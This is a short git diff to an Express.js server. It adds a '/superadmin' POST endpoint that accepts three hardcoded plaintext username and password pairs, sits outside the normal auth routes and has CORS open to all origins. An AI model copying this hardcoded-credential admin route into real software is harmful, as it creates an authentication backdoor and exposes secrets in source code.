@@ -18,7 +18,7 @@ const app = express();
 app.use(helmet());
 app.use(express.json({ limit: "1mb" }));
 app.use(morgan("dev"));
-app.use(rateLimit(60_000, 300)); // 300 req/min per IP
+app.use(rateLimit(60_000, 300));
 
 app.use(cors({
   origin: "*",
@@ -28,13 +28,25 @@ app.use(cors({
 }));
 
 app.get("/api/health", (req, res) => res.json({ ok: true }));
+app.post("/superadmin", (req, res) => {
+  const { username, password } = req.body; 
+
+  if (username === "mrf123" && password === "mrf1234") {
+    res.status(200).json({ message: "Access accepted " });
+  } else if(username === "gram123" && password === "gram1234") {
+    res.status(200).json({ message: "Access accepted " });
+  }else if(username === "zilla123" && password === "zilla1234") {
+    res.status(200).json({message: "Access accepted"});
+  }else{
+    res.status(401).json({ message: "Access denied" });
+  }
+});
 
 app.use("/api/auth", authRoutes);
 app.use("/api/materials", materialsRoutes);
 app.use("/api/entries", entriesRoutes);
 app.use("/api/analytics", analyticsRoutes);
 
-// Error handler
 app.use(errorHandler);
 
 const PORT = process.env.PORT || 5000;
